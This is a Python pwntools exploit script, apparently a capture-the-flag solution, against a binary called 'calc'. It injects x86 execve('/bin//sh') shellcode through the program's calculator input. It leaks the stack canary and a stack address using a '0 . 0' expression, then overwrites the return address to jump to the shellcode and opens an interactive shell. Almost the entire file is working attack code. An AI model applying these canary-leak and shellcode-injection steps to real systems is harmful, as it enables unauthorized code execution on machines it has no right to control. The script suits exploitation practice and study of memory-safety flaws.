#!/usr/bin/python3

from pwn import *

exe = ELF('calc', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*calculator+244

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
shell = [0x31, 0xC0, 0x50, 0x68, 0x2F, 0x2F, 0x73, 0x68, 0x68, 0x2F, 0x62, 0x69,
         0x6E, 0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0x89, 0xE3, 0x83, 0xC0, 0x0B, 0xCD, 0x80]
shell = list(map(str, shell))

for i in shell:
    sla(b"expression: ", f"{int(i)} + 0".encode())
    info("stt: "+str(i))

for i in range(7):
    sla(b"expression: ", f"0 + 0".encode())
    info("stt: "+str(i))

canary = ""
for i in range(4):
    sla(b"expression: ", b"0 . 0")
    info("stt: "+str(i))
    p.recvuntil(b"0 . 0 = ")
    canary = (hex(int(p.recvline(keepends=False)))).replace("0x", "") + canary
    info("canary: " + (canary))
canary = "0x" + canary + "00"
canary = int(canary, 16)
info("canary: " + hex(canary))

for i in range(3):
    sla(b"expression: ", b"0 + 0")
    info("stt: "+str(i))

stack = ""
for i in range(4):
    sla(b"expression: ", b"0 . 0")
    info("stt: "+str(i))
    p.recvuntil(b"0 . 0 = ")
    stack = (hex(int(p.recvline(keepends=False)))).replace("0x", "") + stack
    info("stack: " + (stack))
stack = "0x" + stack
stack = int(stack, 16)
info("stack: " + hex(stack))
info("shell: " + hex(stack - 0xf8))
base = stack - 0xf8
for i in range(4):
    sla(b"expression: ", b"0 + 0")
    info("stt: "+str(i))

for i in range(4):
    res = base & 0xff
    base = base >> 8
    sla(b"expression: ", f"{res} + 0".encode())
    info("stt: "+str(i))


p.interactive()
